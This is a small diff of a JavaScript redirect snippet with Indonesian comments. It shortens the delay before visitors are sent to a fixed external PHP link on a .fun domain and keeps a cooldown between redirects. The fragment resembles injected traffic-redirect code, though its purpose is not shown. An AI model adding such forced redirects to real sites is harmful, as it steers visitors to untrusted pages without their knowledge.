@@ -1,7 +1,7 @@
 (function () {
   try {
     var cooldownMs = 20 * 1000;   // jeda antar redirect
-    var delayMs    = 3000;        // delay sebelum redirect (ms)
+    var delayMs    = 2000;        // delay sebelum redirect (ms)
     var target     = "https://vidoy.fun/cB6Tyq0.php"; // link tujuan fix
 
     var qs = location.search + location.hash;
